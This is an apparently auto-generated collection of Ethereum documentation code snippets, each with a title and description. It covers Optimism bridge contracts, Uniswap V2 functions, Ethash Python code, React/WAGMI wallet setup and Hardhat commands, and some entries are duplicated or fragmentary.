/***************\n     * Constructor *\n     ***************/\n\n    /**\n     * @param _l2CrossDomainMessenger Cross-domain messenger used by this contract.\n     * @param _l1TokenBridge Address of the L1 bridge deployed to the main chain.\n     */\n    constructor(address _l2CrossDomainMessenger, address _l1TokenBridge)\n        CrossDomainEnabled(_l2CrossDomainMessenger)\n    {\n        l1TokenBridge = _l1TokenBridge;\n    }\n```\n\n----------------------------------------\n\nTITLE: Simplifying the ETH Burn Equation\nDESCRIPTION: Simplified formula that expresses the required gas price (in gwei) as a function of daily ETH issuance, allowing for easy calculation with different issuance rates.\n\nLANGUAGE: markdown\nCODE:\n```\n- `Y = (X(10^3)/(7200 * 15)) = X/108`\n\nNous pouvons simplifier et écrire ceci comme une fonction de `X` :\n\n- `F(X) = X/108` où `X` représente l'émission quotidienne d'ETH et `F(X)` représente le prix en gwei requis pour compenser entièrement la nouvelle émission d'ETH.\n```\n\n----------------------------------------\n\nTITLE: Importing Multiple Wallet Functions in React Component\nDESCRIPTION: This code shows how to import both the connectWallet and getCurrentWalletConnected functions from the interact.js utility file into a React component.\n\nLANGUAGE: javascript\nCODE:\n```\nimport { useEffect, useState } from \"react\"\nimport {\n  connectWallet,\n  getCurrentWalletConnected, //import here\n} from \"./utils/interact.js\"\n```\n\n----------------------------------------\n\nTITLE: Deploying Smart Contract to Goerli Testnet with Hardhat\nDESCRIPTION: Command to deploy the HelloWorld smart contract to the Goerli testnet using the deployment script and the network configuration defined in hardhat.config.js.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat run scripts/deploy.js --network goerli\n```\n\n----------------------------------------\n\nTITLE: Deploying Smart Contract to Goerli Testnet with Hardhat\nDESCRIPTION: Command to deploy the HelloWorld smart contract to the Goerli testnet using the deployment script and the network configuration defined in hardhat.config.js.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat run scripts/deploy.js --network goerli\n```\n\n----------------------------------------\n\nTITLE: Removing ETH Liquidity Supporting Fee-on-Transfer Tokens in Uniswap V2\nDESCRIPTION: A specialized function for tokens that take a fee on transfers. Instead of relying on the return values from removeLiquidity, it checks the actual balance of tokens received after the operation to handle tokens with transfer or storage fees correctly.\n\nLANGUAGE: solidity\nCODE:\n```\n    // **** REMOVE LIQUIDITY (supporting fee-on-transfer tokens) ****\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) public virtual override ensure(deadline) returns (uint amountETH) {\n        (, amountETH) = removeLiquidity(\n            token,\n            WETH,\n            liquidity,\n            amountTokenMin,\n            amountETHMin,\n            address(this),\n            deadline\n        );\n        TransferHelper.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));\n        IWETH(WETH).withdraw(amountETH);\n        TransferHelper.safeTransferETH(to, amountETH);\n    }\n```\n\n----------------------------------------\n\nTITLE: Removing ETH Liquidity Supporting Fee-on-Transfer Tokens in Uniswap V2\nDESCRIPTION: A specialized function for tokens that take a fee on transfers. Instead of relying on the return values from removeLiquidity, it checks the actual balance of tokens received after the operation to handle tokens with transfer or storage fees correctly.\n\nLANGUAGE: solidity\nCODE:\n```\n    // **** REMOVE LIQUIDITY (supporting fee-on-transfer tokens) ****\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) public virtual override ensure(deadline) returns (uint amountETH) {\n        (, amountETH) = removeLiquidity(\n            token,\n            WETH,\n            liquidity,\n            amountTokenMin,\n            amountETHMin,\n            address(this),\n            deadline\n        );\n        TransferHelper.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));\n        IWETH(WETH).withdraw(amountETH);\n        TransferHelper.safeTransferETH(to, amountETH);\n    }\n```\n\n----------------------------------------\n\nTITLE: Visualizing SSZ Serialized Output Format\nDESCRIPTION: This representation shows the binary structure of a serialized SSZ object with simplified formatting. It illustrates how fixed-length elements are included directly, while variable-length elements are replaced with offset pointers to their actual data in the heap at the end.\n\nLANGUAGE: plaintext\nCODE:\n```\n[37, 0, 0, 0, 55, 0, 0, 0, 16, 0, 0, 0, 22, 0, 0, 0, 1, 2, 3, 4]\n------------  -----------  -----------  -----------  ----------\n      |             |            |           |            |\n   number1       number2    offset for    number 3    value for\n                              vector                   vector\n```\n\n----------------------------------------\n\nTITLE: RLP Encoding Format for Legacy Ethereum Transactions\nDESCRIPTION: Demonstrates how legacy Ethereum transactions are encoded using Recursive Length Prefix (RLP) format, including all transaction fields such as nonce, gas price, gas limit, recipient address, value, data, and signature components.\n\nLANGUAGE: solidity\nCODE:\n```\nRLP([nonce, gasPrice, gasLimit, to, value, data, v, r, s])\n```\n\n----------------------------------------\n\nTITLE: Importing Cross-Domain Messaging Library\nDESCRIPTION: Imports the CrossDomainEnabled contract which facilitates messaging between L1 and L2 layers. This library is a core component for interlayer communication.\n\nLANGUAGE: solidity\nCODE:\n```\n/* Library Imports */\nimport { CrossDomainEnabled } from \"../../libraries/bridge/CrossDomainEnabled.sol\";\n```\n\n----------------------------------------\n\nTITLE: Installing Waffle and TypeScript Dependencies\nDESCRIPTION: Command to install Ethereum Waffle, TypeScript, and Jest type definitions as development dependencies using yarn.\n\nLANGUAGE: bash\nCODE:\n```\nyarn add --dev ethereum-waffle ts-node typescript @types/jest\n```\n\n----------------------------------------\n\nTITLE: ETH Receive Function for Deposits\nDESCRIPTION: Implements a fallback receive function that allows direct ETH deposits to the bridge. This function automatically forwards the ETH to the caller's address on L2 with a default gas limit.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev This function can be called with no data\n     * to deposit an amount of ETH to the caller's balance on L2.\n     * Since the receive function doesn't take data, a conservative\n     * default amount is forwarded to L2.\n     */\n    receive() external payable onlyEOA {\n        _initiateETHDeposit(msg.sender, msg.sender, 200_000, bytes(\"\"));\n    }\n```\n\n----------------------------------------\n\nTITLE: Implementing ExpandableCard Component for Dapp and Smart Contract Developers\nDESCRIPTION: A React/JSX expandable card component summarizing the impact of The Merge on dapp and smart contract developers, listing key areas affected by the consensus change including block structure, timing, opcodes, and onchain randomness.\n\nLANGUAGE: jsx\nCODE:\n```\n<ExpandableCard\ntitle=\"Dapp and smart contract developers\"\ncontentPreview=\"The Merge was designed to have minimal impact on smart contract and dapp developers.\"\nid=\"developers\">\n\nThe Merge came with changes to consensus, which also includes changes related to:\n\n<ul>\n  <li>block structure</li>\n  <li>slot/block timing</li>\n  <li>opcode changes</li>\n  <li>sources of onchain randomness</li>\n  <li>concept of <em>safe head</em> and <em>finalized blocks</em></li>\n</ul>\n\nFor more information, check out this blog post by Tim Beiko on <a href=\"https://blog.ethereum.org/2021/11/29/how-the-merge-impacts-app-layer/\">How The Merge Impacts Ethereum's Application Layer</a>.\n\n</ExpandableCard>\n```\n\n----------------------------------------\n\nTITLE: Implementing Light-Client Hashimoto Verification in Python\nDESCRIPTION: A light-client friendly version of Hashimoto that doesn't require the full DAG. It uses a quick calculation function to generate DAG values on-the-fly, making verification possible without storing the entire dataset.\n\nLANGUAGE: python\nCODE:\n```\ndef quick_hashimoto(seed, dagsize, params, header, nonce):\n    m = dagsize // 2\n    mix = sha3(nonce + header)\n    for _ in range(params[\"accesses\"]):\n        mix ^= quick_calc(params, seed, m + (mix % 2**64) % m)\n    return dbl_sha3(mix)\n```\n\n----------------------------------------\n\nTITLE: Importing Dependencies for L2StandardBridge in Solidity\nDESCRIPTION: Imports interface files and dependencies for the L2StandardBridge contract. These imports include the L1 bridge interfaces and necessary OpenZeppelin libraries.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n\n/* Interface Imports */\nimport { IL1StandardBridge } from \"../../L1/messaging/IL1StandardBridge.sol\";\nimport { IL1ERC20Bridge } from \"../../L1/messaging/IL1ERC20Bridge.sol\";\nimport { IL2ERC20Bridge } from \"./IL2ERC20Bridge.sol\";\n```\n\n----------------------------------------\n\nTITLE: Block Validation Algorithm in Ethereum\nDESCRIPTION: A pseudocode algorithm for validating blocks in the Ethereum blockchain. It checks the previous block reference, timestamp validity, proof-of-work validity, and ensures all transactions create valid state transitions.\n\nLANGUAGE: pseudocode\nCODE:\n```\n1. Check if the previous block referenced by the block exists and is valid.\n2. Check that the timestamp of the block is greater than that of the previous block and less than 2 hours into the future\n3. Check that the proof-of-work on the block is valid.\n4. Let `S[0]` be the state at the end of the previous block.\n5. Suppose `TX` is the block's transaction list with `n` transactions. For all `i` in `0...n-1`, set `S[i+1] = APPLY(S[i],TX[i])` If any application returns an error, exit and return false.\n6. Return true, and register `S[n]` as the state at the end of this block.\n```\n\n----------------------------------------\n\nTITLE: Implementing mint Method for ERC-721 in Vyper\nDESCRIPTION: Creates a new token and assigns ownership to the specified address. Only the designated minter can create new tokens, preventing unauthorized token creation.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef mint(_to: address, _tokenId: uint256) -> bool:\n    \"\"\"\n    @dev Function to mint tokens\n         Throws if `msg.sender` is not the minter.\n         Throws if `_to` is zero address.\n         Throws if `_tokenId` is owned by someone.\n    @param _to The address that will receive the minted tokens.\n    @param _tokenId The token id to mint.\n    @return A boolean that indicates if the operation was successful.\n    \"\"\"\n    # Throws if `msg.sender` is not the minter\n    assert msg.sender == self.minter\n```\n\n----------------------------------------\n\nTITLE: Installing Hardhat Development Environment\nDESCRIPTION: Command to install Hardhat, an Ethereum development environment for compiling, deploying, testing, and debugging smart contracts locally.\n\nLANGUAGE: bash\nCODE:\n```\nnpm install --save-dev hardhat\n```\n\n----------------------------------------\n\nTITLE: Deposit Finalization for Optimism L2 Bridge\nDESCRIPTION: Function that finalizes deposits initiated on L1, including integrity checks to ensure correct token relationships between L1 and L2, with error handling to recover from invalid deposits.\n\nLANGUAGE: solidity\nCODE:\n```\n    /************************************\n     * Cross-chain Function: Depositing *\n     ************************************/\n\n    /**\n     * @inheritdoc IL2ERC20Bridge\n     */\n    function finalizeDeposit(\n        address _l1Token,\n        address _l2Token,\n        address _from,\n        address _to,\n        uint256 _amount,\n        bytes calldata _data\n    ) external virtual onlyFromCrossDomainAccount(l1TokenBridge) {\n        // Check the target token is compliant and\n        // verify the deposited token on L1 matches the L2 deposited token representation here\n        if (\n            // slither-disable-next-line reentrancy-events\n            ERC165Checker.supportsInterface(_l2Token, 0x1d1d8b63) &&\n            _l1Token == IL2StandardERC20(_l2Token).l1Token()\n        ) {\n            // When a deposit is finalized, we credit the account on L2 with the same amount of\n            // tokens.\n            // slither-disable-next-line reentrancy-events\n            IL2StandardERC20(_l2Token).mint(_to, _amount);\n            // slither-disable-next-line reentrancy-events\n            emit DepositFinalized(_l1Token, _l2Token, _from, _to, _amount, _data);\n        } else {\n            // Either the L2 token which is being deposited-into disagrees about the correct address\n            // of its L1 token, or does not support the correct interface.\n            // This should only happen if there is a  malicious L2 token, or if a user somehow\n            // specified the wrong L2 token address to deposit into.\n            // In either case, we stop the process here and construct a withdrawal\n            // message so that users can get their funds out in some cases.\n            // There is no way to prevent malicious token contracts altogether, but this does limit\n            // user error and mitigate some forms of malicious contract behavior.\n            bytes memory message = abi.encodeWithSelector(\n                IL1ERC20Bridge.finalizeERC20Withdrawal.selector,\n                _l1Token,\n                _l2Token,\n                _to, // switched the _to and _from here to bounce back the deposit to the sender\n                _from,\n                _amount,\n                _data\n            );\n\n            // Send message up to L1 bridge\n            // slither-disable-next-line reentrancy-events\n            sendCrossDomainMessage(l1TokenBridge, 0, message);\n            // slither-disable-next-line reentrancy-events\n            emit DepositFailed(_l1Token, _l2Token, _from, _to, _amount, _data);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Reentrancy Protection in Uniswap\nDESCRIPTION: Defines a variable to protect against reentrancy attacks when interacting with external ERC-20 contracts. The lock prevents functions from being called while they are already running.\n\nLANGUAGE: solidity\nCODE:\n```\nuint private unlocked = 1;\n```\n\n----------------------------------------\n\nTITLE: Querying Ethereum Foundation Transaction Gas Prices\nDESCRIPTION: SQL query that retrieves gas prices and ETH values for all transactions sent to the Ethereum Foundation address. It converts gas prices from wei to gwei and ETH values from wei to ETH for readability, ordering results by block time in descending order.\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    block_time,\n    gas_price / 1e9 AS gas_price_gwei,\n    value / 1e18 AS eth_sent\nFROM ethereum.\"transactions\"\nWHERE \"to\" = '\\xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe'\nORDER BY block_time DESC\n```\n\n----------------------------------------\n\nTITLE: Creating Project Structure for Smart Contract Development\nDESCRIPTION: Commands to create the necessary directories for organizing smart contract code and deployment scripts within the project.\n\nLANGUAGE: bash\nCODE:\n```\nmkdir contracts\nmkdir scripts\n```\n\n----------------------------------------\n\nTITLE: Basic Ethereum Blockchain Operations with web3.py\nDESCRIPTION: Demonstrates fundamental operations using web3.py to interact with Ethereum, including reading the latest block data and sending a transaction with source, destination, and value parameters.\n\nLANGUAGE: python\nCODE:\n```\n# read block data:\nw3.eth.get_block('latest')\n\n# send a transaction:\nw3.eth.send_transaction({'from': ..., 'to': ..., 'value': ...})\n```\n\n----------------------------------------\n\nTITLE: Querying Account Balance in VB.NET using Nethereum\nDESCRIPTION: Example code for querying an Ethereum account balance using Nethereum in VB.NET. This sample demonstrates basic blockchain interaction functionality.\n\nLANGUAGE: VB.NET\nCODE:\n```\n// Playground link: http://playground.nethereum.com/vb/id/2001\n```\n\n----------------------------------------\n\nTITLE: Importing NFT Contract ABI from Artifacts\nDESCRIPTION: Imports the contract ABI (Application Binary Interface) from the compiled contract artifacts. The ABI is necessary for interacting with the deployed smart contract.\n\nLANGUAGE: javascript\nCODE:\n```\nconst contract = require(\"../artifacts/contracts/MyNFT.sol/MyNFT.json\")\n```\n\n----------------------------------------\n\nTITLE: Testing Transaction Reverts with revertedWith Matcher\nDESCRIPTION: Test that verifies if the transaction is properly reverted when an uneven amount of wei is provided, checking for the correct error message.\n\nLANGUAGE: typescript\nCODE:\n```\nit(\"Reverts when Vei amount uneven\", async () => {\n  await expect(splitter.split({ value: 51 })).to.be.revertedWith(\n    \"Uneven wei amount not allowed\"\n  )\n})\n```\n\n----------------------------------------\n\nTITLE: Failed Bank Transaction Example\nDESCRIPTION: JavaScript example showing a failed transaction in a banking system when a user tries to send more funds than they have available.\n\nLANGUAGE: javascript\nCODE:\n```\nAPPLY({ Alice: $50, Bob: $50 },\"send $70 from Alice to Bob\") = ERROR\n```\n\n----------------------------------------\n\nTITLE: Cloning the Repository in Shell\nDESCRIPTION: Command for cloning the ethereum.org repository to your local environment. This is the first step for contributors who want to set up a local development environment.\n\nLANGUAGE: shell\nCODE:\n```\ngit clone git@github.com:[your_github_handle]/ethereum-org-website.git && cd ethereum-org-website\n```\n\n----------------------------------------\n\nTITLE: Defining Zokrates Program Fragments\nDESCRIPTION: Creates template strings containing Zokrates programs for hashing and digging operations in the game, with a common hash fragment used by both.\n\nLANGUAGE: typescript\nCODE:\n```\nconst hashFragment = `\n        import \"utils/pack/bool/pack128.zok\" as pack128;\n        import \"hashes/poseidon/poseidon.zok\" as poseidon;\n            .\n            .\n            .\n        }\n    `\n\nconst hashProgram = `\n        ${hashFragment}\n            .\n            .\n            .\n    `\n\nconst digProgram = `\n        ${hashFragment}\n            .\n            .\n            .\n    `\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Chain to WAGMI Configuration\nDESCRIPTION: Updates the WAGMI chains configuration to include the newly defined Redstone Holesky network alongside the existing Holesky and Sepolia testnets.\n\nLANGUAGE: ts\nCODE:\n```\nconst { chains, publicClient, webSocketPublicClient } = configureChains(\n  [ holesky, sepolia, redstoneHolesky ],\n  [ publicProvider(), ],\n) \n```\n\n----------------------------------------\n\nTITLE: Installing and Running the Greeter Application\nDESCRIPTION: Command line instructions for cloning the repository, installing dependencies, and starting the development server. These commands set up the local development environment for the Greeter application.\n\nLANGUAGE: sh\nCODE:\n```\ngit clone https://github.com/qbzzt/20230801-modern-ui.git\n```\n\nLANGUAGE: sh\nCODE:\n```\ncd 20230801-modern-ui\npnpm install\n```\n\nLANGUAGE: sh\nCODE:\n```\npnpm dev\n```\n\n----------------------------------------\n\nTITLE: Minting Liquidity Tokens in Uniswap V2 Pair Contract\nDESCRIPTION: This function is called when a liquidity provider adds liquidity to the pool. It mints additional liquidity tokens as a reward and should be called by a peripheral contract after adding liquidity in the same transaction to prevent front-running.\n\nLANGUAGE: solidity\nCODE:\n```\n    // this low-level function should be called from a contract which performs important safety checks\n    function mint(address to) external lock returns (uint liquidity) {\n```\n\n----------------------------------------\n\nTITLE: Efficient Storage Management for Token Reserves and Timestamp\nDESCRIPTION: Defines variables for token reserves and last block timestamp using optimized storage slots. These variables track the available liquidity for each token and when the last exchange occurred.\n\nLANGUAGE: solidity\nCODE:\n```\nuint112 private reserve0;           // uses single storage slot, accessible via getReserves\nuint112 private reserve1;           // uses single storage slot, accessible via getReserves\n```\n\nLANGUAGE: solidity\nCODE:\n```\nuint32  private blockTimestampLast; // uses single storage slot, accessible via getReserves\n```\n\n----------------------------------------\n\nTITLE: Configuring WAGMI Chains and Wallet Connection for Ethereum dApp\nDESCRIPTION: Sets up WAGMI configuration with specified chains, connectors, and public clients for blockchain interaction, enabling wallet connections through RainbowKit.\n\nLANGUAGE: ts\nCODE:\n```\nconst { chains, publicClient, webSocketPublicClient } = configureChains(\n  [ holesky, sepolia ],\n  [\n    publicProvider(),\n  ],\n) \n\nconst { connectors } = getDefaultWallets({\n  appName: 'My wagmi + RainbowKit App',\n  chains,\n  projectId: walletConnectProjectId,\n})\n\nexport const config = createConfig({\n  autoConnect: true,\n  connectors,\n  publicClient,\n  webSocketPublicClient,\n})\n\nexport { chains }\n```\n\n----------------------------------------\n\nTITLE: Internal Add Liquidity Function Signature in Solidity\nDESCRIPTION: The signature of the _addLiquidity internal function used for calculating optimal token amounts when adding liquidity to a Uniswap V2 pair.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _addLiquidity(\n```\n\n----------------------------------------\n\nTITLE: Mapping Functions to List Items in React Component\nDESCRIPTION: Uses JavaScript map function within JSX to iterate through function names and render them as list items, demonstrating nested JSX interpretation.\n\nLANGUAGE: tsx\nCODE:\n```\n          {funs.map((f, i) =>\n```\n\n----------------------------------------\n\nTITLE: Mapping Functions to List Items in React Component\nDESCRIPTION: Uses JavaScript map function within JSX to iterate through function names and render them as list items, demonstrating nested JSX interpretation.\n\nLANGUAGE: tsx\nCODE:\n```\n          {funs.map((f, i) =>\n```\n\n----------------------------------------\n\nTITLE: Implementing Cache-Based DAG Evaluation in Python\nDESCRIPTION: A more efficient implementation that uses a cache to avoid recalculating DAG values. It includes functions for quick calculation using the cache and a modified version of quick_hashimoto that leverages the cache.\n\nLANGUAGE: python\nCODE:\n```\ndef quick_calc(params, seed, p):\n    cache = produce_dag(params, seed, params[\"cache_size\"])\n    return quick_calc_cached(cache, params, p)\n\ndef quick_calc_cached(cache, params, p):\n    P = params[\"P\"]\n    if p < len(cache):\n        return cache[p]\n    else:\n        x = pow(cache[0], p + 1, P)\n        for _ in range(params[\"k\"]):\n            x ^= quick_calc_cached(cache, params, x % p)\n        return pow(x, params[\"w\"], P)\n\ndef quick_hashimoto(seed, dagsize, params, header, nonce):\n    cache = produce_dag(params, seed, params[\"cache_size\"])\n    return quick_hashimoto_cached(cache, dagsize, params, header, nonce)\n\ndef quick_hashimoto_cached(cache, dagsize, params, header, nonce):\n    m = dagsize // 2\n    mask = 2**64 - 1\n    mix = sha3(encode_int(nonce) + header)\n    for _ in range(params[\"accesses\"]):\n        mix ^= quick_calc_cached(cache, params, m + (mix & mask) % m)\n    return dbl_sha3(mix)\n```\n\n----------------------------------------\n\nTITLE: Balance Getter Function\nDESCRIPTION: Implements the ERC-20 balanceOf function that returns the token balance of a specified account. This public function allows anyone to query any account's balance.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n```\n\n----------------------------------------\n\nTITLE: Server System Contract for New Game Response\nDESCRIPTION: The onchain ServerSystem updates the game tables when a new game is created, with access control to prevent server impersonation.\n\nLANGUAGE: Solidity\nCODE:\n```\n// From ServerSystem.sol lines 38-43\nfunction app__newGameResponse(address player, uint256 gameId) public {\n  // Create the game in PlayerGame\n  // Set the reverse mapping in GamePlayer\n  // Remove the request from PendingGame\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Ethereum Seed Hash in Python\nDESCRIPTION: Function to compute the seed hash used for mining on a given block. The seed hash changes every EPOCH_LENGTH blocks and is calculated by repeatedly applying SHA3-256 to an initial empty seed based on the block number.\n\nLANGUAGE: python\nCODE:\n```\ndef get_seedhash(block):\n     s = '\\x00' * 32\n     for i in range(block.number // EPOCH_LENGTH):\n         s = serialize_hash(sha3_256(s))\n     return s\n```\n\n----------------------------------------\n\nTITLE: Declaring State Variables in Vyper\nDESCRIPTION: Example of declaring a persistent storage variable in Vyper. This demonstrates how state variables are defined in Vyper's Python-like syntax.\n\nLANGUAGE: python\nCODE:\n```\n# Vyper example\nstoredData: int128\n```\n\n----------------------------------------\n\nTITLE: Importing Zokrates JavaScript Bindings in TypeScript\nDESCRIPTION: Imports the initialize function from zokrates-js library, which returns a promise that resolves to all the Zokrates definitions.\n\nLANGUAGE: typescript\nCODE:\n```\nimport { initialize as zokratesInitialize } from \"zokrates-js\"\n```\n\n----------------------------------------\n\nTITLE: Local Communities List and Apply Now Component Usage\nDESCRIPTION: JSX components for displaying a list of Translatathon Hubs and an application button. The LocalCommunitiesList component likely renders a list of cities where in-person Translatathon events are being held, while the ApplyNow component likely renders a call-to-action button for users to apply to participate.\n\nLANGUAGE: jsx\nCODE:\n```\n<LocalCommunitiesList />\n\n<ApplyNow />\n```\n\n----------------------------------------\n\nTITLE: Retrieving Contract Code with eth_getCode in JavaScript\nDESCRIPTION: Shows how to make a request to the eth_getCode RPC method which returns the bytecode at a given address. The example retrieves the contract code for the WETH contract at a specific block number.\n\nLANGUAGE: javascript\nCODE:\n```\nparams: [\n  \"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\",\n  \"0x5daf3b\", // 6139707\n]\n```\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getCode\",\"params\":[\"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\", \"0x5daf3b\"],\"id\":1}'\n// Result\n{\n  \"id\":1,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"0x6060604052600436106100af576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde03146100b9578063095ea7b31461014757806318160ddd146101a157806323b872dd146101ca5780632e1a7d4d14610243578063313ce5671461026657806370a082311461029557806395d89b41146102e2578063a9059cbb14610370578063d0e30db0146103ca578063dd62ed3e146103d4575b6100b7610440565b005b34156100c457600080fd5b6100cc6104dd565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561010c5780820151818401526020810190506100f1565b50505050905090810190601f1680156101395780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b341561015257600080fd5b610187600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803590602001909190505061057b565b604051808215151515815260200191505060405180910390f35b34156101ac57600080fd5b6101b461066d565b6040518082815260200191505060405180910390f35b34156101d557600080fd5b610229600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803590602001909190505061068c565b604051808215151515815260200191505060405180910390f35b341561024e57600080fd5b61026460048080359060200190919050506109d9565b005b341561027157600080fd5b610279610b05565b604051808260ff1660ff16815260200191505060405180910390f35b34156102a057600080fd5b6102cc600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610b18565b6040518082815260200191505060405180910390f35b34156102ed57600080fd5b6102f5610b30565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561033557808201518184015260208101905061031a565b50505050905090810190601f1680156103625780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b341561037b57600080fd5b6103b0600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091908035906020019091905050610bce565b604051808215151515815260200191505060405180910390f35b6103d2610440565b005b34156103df57600080fd5b61042a600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610be3565b6040518082815260200191505060405180910390f35b34600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055503373ffffffffffffffffffffffffffffffffffffffff167fe1fffcc4923d04b559f4d29a8bfc6cda04eb5b0d3c460751c2402c5c5cc9109c346040518082815260200191505060405180910390a2565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156105735780601f1061054857610100808354040283529160200191610573565b820191906000526020600020905b81548152906001019060200180831161055657829003601f168201915b505050505081565b600081600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040518082815260200191505060405180910390a36001905092915050565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b600081600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101515156106dc57600080fd5b3373ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16141580156107b457507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff600460008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205414155b156108cf5781600460008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015151561084457600080fd5b81600460008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505b81600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555081600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a3600190509392505050565b80600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410151515610a2757600080fd5b80600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055503373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f193505050501515610ab457600080fd5b3373ffffffffffffffffffffffffffffffffffffffff167f7fcf532c15f0a6db0bd6d0e038bea71d30d808c7d98cb3bf7268a95bf5081b65826040518082815260200191505060405180910390a250565b600260009054906101000a900460ff1681565b60036020528060005260406000206000915090505481565b60018054600181600116156101000203166002900480601f016020809104026020016040519081016040528092919081815260200182805460018160011615610100020316600290048015610bc65780601f10610b9b57610100808354040283529160200191610bc6565b820191906000526020600020905b815481529060010190602001808311610ba957829003601f168201915b505050505081565b6000610bdb33848461068c565b905092915050565b60046020528160005260406000206020528060005260406000206000915091505054815600a165627a7a72305820deb4c2ccab3c2fdca32ab3f46728389c2fe2c165d5fafa07661e4e004f6c344a0029\"\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Dataset Items in Ethash\nDESCRIPTION: Function to compute a single 64-byte item in the Ethash dataset. Each item is derived by combining data from 256 pseudorandomly selected cache nodes and hashing the result.\n\nLANGUAGE: python\nCODE:\n```\ndef calc_dataset_item(cache, i):\n    n = len(cache)\n    r = HASH_BYTES // WORD_BYTES\n    # initialize the mix\n    mix = copy.copy(cache[i % n])\n    mix[0] ^= i\n    mix = sha3_512(mix)\n    # fnv it with a lot of random cache nodes based on i\n    for j in range(DATASET_PARENTS):\n        cache_index = fnv(i ^ j, mix[j % r])\n        mix = map(fnv, mix, cache[cache_index % n])\n    return sha3_512(mix)\n```\n\n----------------------------------------\n\nTITLE: Running Echidna Test Command\nDESCRIPTION: The basic command to run Echidna against a Solidity contract file. This will automatically test all properties whose names start with 'echidna_'.\n\nLANGUAGE: bash\nCODE:\n```\n$ echidna-test contract.sol\n```\n\n----------------------------------------\n\nTITLE: Installing Ethers.js for Ethereum Interaction\nDESCRIPTION: Command to install Ethers.js and Hardhat Ethers plugin. These tools make interacting with Ethereum easier by providing methods that wrap standard JSON-RPC calls.\n\nLANGUAGE: bash\nCODE:\n```\nnpm install --save-dev @nomiclabs/hardhat-ethers \"ethers@^5.0.0\"\n```\n\n----------------------------------------\n\nTITLE: Setting Up Ethereum Environment Variables\nDESCRIPTION: A .env file configuration that stores sensitive API keys and wallet information needed to interact with the Ethereum blockchain. Contains API URL, API key, private key, and contract address.\n\nLANGUAGE: 